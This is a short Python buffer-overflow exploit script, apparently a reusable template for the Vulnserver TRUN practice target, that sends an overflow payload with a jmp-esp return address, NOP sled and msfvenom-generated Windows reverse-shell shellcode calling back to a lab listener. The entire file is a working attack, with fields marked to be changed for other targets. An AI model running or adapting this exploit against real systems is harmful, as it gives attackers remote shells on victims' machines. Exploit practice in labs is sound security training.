#!/bin/python3


import socket


ip = "10.0.2.15"    # Target IP - CHANGE
port = 9999         # Target Port - CHANGE

prefix = "TRUN /.:/"    # Prefix - CHANGE
buffer = "A" * 2003     # Buffer till EIP - CHANGE
eip_value_pointing_to_esp = "\x61\x5C\x9E\x77"   # EIP pointing to "jmp esp" - CHANGE
nops = "\x90" * 40    # NOPS Padding

# msfvenom -p windows/shell_reverse_tcp -LHOST=10.0.2.6 -LPORT=2345 -a x86 -b "\x00" -f c
shellcode = "\xba\x1e\xab\xe6\xc6\xd9\xed\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"\
        + "\x52\x31\x53\x12\x03\x53\x12\x83\xf5\x57\x04\x33\xf5\x40\x4b"\
        + "\xbc\x05\x91\x2c\x34\xe0\xa0\x6c\x22\x61\x92\x5c\x20\x27\x1f"\
        + "\x16\x64\xd3\x94\x5a\xa1\xd4\x1d\xd0\x97\xdb\x9e\x49\xeb\x7a"\
        + "\x1d\x90\x38\x5c\x1c\x5b\x4d\x9d\x59\x86\xbc\xcf\x32\xcc\x13"\
        + "\xff\x37\x98\xaf\x74\x0b\x0c\xa8\x69\xdc\x2f\x99\x3c\x56\x76"\
        + "\x39\xbf\xbb\x02\x70\xa7\xd8\x2f\xca\x5c\x2a\xdb\xcd\xb4\x62"\
        + "\x24\x61\xf9\x4a\xd7\x7b\x3e\x6c\x08\x0e\x36\x8e\xb5\x09\x8d"\
        + "\xec\x61\x9f\x15\x56\xe1\x07\xf1\x66\x26\xd1\x72\x64\x83\x95"\
        + "\xdc\x69\x12\x79\x57\x95\x9f\x7c\xb7\x1f\xdb\x5a\x13\x7b\xbf"\
        + "\xc3\x02\x21\x6e\xfb\x54\x8a\xcf\x59\x1f\x27\x1b\xd0\x42\x20"\
        + "\xe8\xd9\x7c\xb0\x66\x69\x0f\x82\x29\xc1\x87\xae\xa2\xcf\x50"\
        + "\xd0\x98\xa8\xce\x2f\x23\xc9\xc7\xeb\x77\x99\x7f\xdd\xf7\x72"\
        + "\x7f\xe2\x2d\xd4\x2f\x4c\x9e\x95\x9f\x2c\x4e\x7e\xf5\xa2\xb1"\
        + "\x9e\xf6\x68\xda\x35\x0d\xfb\xef\xc9\x0f\xfd\x87\xcb\x0f\x08"\
        + "\x71\x45\xe9\x60\x91\x03\xa2\x1c\x08\x0e\x38\xbc\xd5\x84\x45"\
        + "\xfe\x5e\x2b\xba\xb1\x96\x46\xa8\x26\x57\x1d\x92\xe1\x68\x8b"\
        + "\xba\x6e\xfa\x50\x3a\xf8\xe7\xce\x6d\xad\xd6\x06\xfb\x43\x40"\
        + "\xb1\x19\x9e\x14\xfa\x99\x45\xe5\x05\x20\x0b\x51\x22\x32\xd5"\
        + "\x5a\x6e\x66\x89\x0c\x38\xd0\x6f\xe7\x8a\x8a\x39\x54\x45\x5a"\
        + "\xbf\x96\x56\x1c\xc0\xf2\x20\xc0\x71\xab\x74\xff\xbe\x3b\x71"\
        + "\x78\xa3\xdb\x7e\x53\x67\xeb\x34\xf9\xce\x64\x91\x68\x53\xe9"\
        + "\x22\x47\x90\x14\xa1\x6d\x69\xe3\xb9\x04\x6c\xaf\x7d\xf5\x1c"\
        + "\xa0\xeb\xf9\xb3\xc1\x39"    # Shellcode - CHANGE
esp = nops + shellcode

payload = prefix + buffer + eip_value_pointing_to_esp + esp


listener = input("[*] Ready with the Listener? [Y/N] : ")
print("")

if listener.lower() == "y":
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        print("[*] Sending Payload.")
        s.send(payload.encode("latin-1"))
else:
    print("[-] Please start Listener.")

